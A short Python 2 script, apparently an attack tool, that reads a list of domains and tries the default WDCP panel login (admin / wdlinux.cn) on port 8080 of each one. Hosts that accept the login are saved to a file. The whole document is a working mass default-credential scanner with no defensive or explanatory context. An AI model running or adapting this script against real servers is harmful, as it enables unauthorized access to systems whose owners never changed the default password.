try:
    import requests
except ImportError:
    raise SystemExit('\n[!] requests模块导入错误,请执行pip install requests安装!')

i=0
lines = open("domains.txt","r")
for line in lines:
    line=line.rstrip()
    i = i + 1;
    print i
    try:
        s = requests.Session()
        url = 'http://'+line+':8080/login'
        payload = {'username': 'admin', 'passwd': 'wdlinux.cn'}
        header = {'Cookie': 'saeut=125.122.24.125.1416063016314663;', 'Content-Type': 'application/x-www-form-urlencoded;', 'Submit_login': '',}        
        r = s.post(url, data=payload, headers=header)
        if 'index' in r.content:
            print 'success'
            f= file('wdcp',"a+")
            f.write(line+"\n")
            f.close()        
    except:
        pass

